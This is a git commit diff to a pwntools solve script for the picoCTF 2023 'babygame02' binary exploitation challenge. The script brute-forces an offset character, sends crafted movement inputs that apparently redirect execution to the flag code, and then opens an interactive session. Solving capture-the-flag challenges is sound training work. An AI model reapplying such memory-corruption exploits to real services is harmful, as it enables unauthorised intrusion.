067954c3a4431e3aa726a756cb982c01e365e4d3
Mark Uche <113513376+markuched13@users.noreply.github.com>
2023-03-28 15:35:54 +0100

    Update babygame02.py

--- solvescript/pico23/pwn/babygame02.py
+++ solvescript/pico23/pwn/babygame02.py
@@ -7,34 +7,28 @@ import string
 import warnings
 
 warnings.filterwarnings('ignore')
-context.log_level = 'info'
+context.log_level = 'warning'
 
 hostname = sys.argv[1]
 port = sys.argv[2]
 
-def brute():
-    for i in string.printable:
-        io = remote(f'{hostname}', f'{port}')
-        io.sendline('l'+i)
-        io.sendline(b'w'*4)
-        io.sendline(b'd'*47)
-        io.sendline(b'wp')
-        recv = io.recvall()
-        if b'picoCTF' in recv:
-            print(f'Remote offset found as {i}')
-            offset = i 
-            return offset
-            break
 
-offset = brute()
-if offset:
-    getflag(offset)
-
-def getflag(offset):
+for i in string.printable:
     io = remote(f'{hostname}', f'{port}')
-    io.sendline('l'+offset)
+    io.sendline('l'+i)
     io.sendline(b'w'*4)
     io.sendline(b'd'*47)
     io.sendline(b'wp')
-    flag = io.recvall()
-    success(flag)
+    recv = io.recvall()
+    if b'picoCTF' in recv:
+        print(f'Remote offset found as {i}')
+        offset = i 
+        break
+
+print(offset)
+io = remote(f'{hostname}', f'{port}')
+io.sendline('l'+offset)
+io.sendline(b'w'*4)
+io.sendline(b'd'*47)
+io.sendline(b'wp')
+io.interactive()
